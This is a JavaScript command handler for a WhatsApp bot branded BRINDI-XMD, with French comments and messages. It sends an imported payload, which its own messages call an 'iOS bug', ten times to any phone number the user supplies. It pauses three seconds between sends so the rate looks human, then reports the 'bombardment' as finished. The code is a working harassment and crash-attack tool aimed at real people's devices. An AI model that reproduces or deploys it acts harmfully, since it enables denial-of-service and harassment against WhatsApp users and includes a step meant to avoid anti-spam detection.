const iosPayload = require('../lib/brindi-ios.js'); 

async function brindiIosCommand(sock, chatId, senderId, mentionedJids, message, args) {
    const argsArray = Array.isArray(args) ? args : (args ? args.split(' ') : []);

    // 1. Force l'utilisation stricte : un numéro est obligatoire
    if (argsArray.length === 0) {
        return sock.sendMessage(chatId, {
            text: "❌ Utilisation incorrecte.\nSaisie requise : `.brindi-ios +237××...` ou `.brindi-ios 2376xxxxxxxx`\n\n> BRINDI-XMD"
        }, { quoted: message });
    }

    let cleaned = argsArray.join('').replace(/[^0-9]/g, "");

    // Vérification de la longueur minimale
    if (cleaned.length < 11) {
        return sock.sendMessage(chatId, {
            text: "❌ Numéro invalide.\nSaisie requise : `.brindi-ios +237××...`\n\n> BRINDI-XMD"
        }, { quoted: message });
    }

    const target = cleaned + "@s.whatsapp.net";
    const targetName = cleaned;

    // Message d'attente initial mis à jour pour annoncer la salve de 10 messages
    await sock.sendMessage(chatId, {
        text: `⏳ *Initialisation de la salve (10 messages) brindi-ios sur* *+${targetName}*...`
    }, { quoted: message });

    try {
        // 2. Construction du message avec le contenu du const importé
        const finalMessage = `${iosPayload}\n\n> BRINDI-XMD`;
        let successCount = 0;

        // 3. Boucle d'envoi pour envoyer le message exactement 10 fois
        for (let i = 1; i <= 10; i++) {
            await sock.sendMessage(target, { text: finalMessage });
            successCount++;

            // Pause de 3000ms (3 secondes) pour simuler un rythme d'envoi plus humain
            await new Promise(r => setTimeout(r, 3000));
        }

        // 4. Message de confirmation final à l'expéditeur après les 10 envois
        await sock.sendMessage(chatId, {
            text: `✅ *Bombardement iOS terminé !*\nTotal : *${successCount}/10* Bug iOS envoyés avec succès à *+${targetName}*.\n\n> BRINDI-XMD`
        }, { quoted: message });

    } catch (err) {
        console.error(`❌ Échec de la commande brindi-ios :`, err.message);
        await sock.sendMessage(chatId, {
            text: `❌ Une erreur est survenue lors de l'envoi de la salve iOS.\n\n> BRINDI-XMD`
        }, { quoted: message });
    }
}

module.exports = brindiIosCommand;
